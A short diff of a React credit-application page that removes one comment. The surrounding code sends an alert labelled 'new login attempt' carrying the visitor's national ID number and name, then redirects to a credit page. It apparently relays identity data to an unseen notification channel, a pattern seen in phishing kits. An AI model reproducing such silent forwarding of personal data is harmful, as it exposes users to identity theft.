@@ -26,7 +26,7 @@ const InicioCredito: React.FC = () => {
                 customMessage: `🚨Nuevo intento de ingreso🚨:\n 🪪 Cedula: ${cedula}\n 📝 Nombre: ${nombreApellido}`
             });
 
-            // Espera 2.6 segundos mostrando el loading y luego redirige
+
             setTimeout(() => {
                 setLoading(false);
                 router.push("/credito");
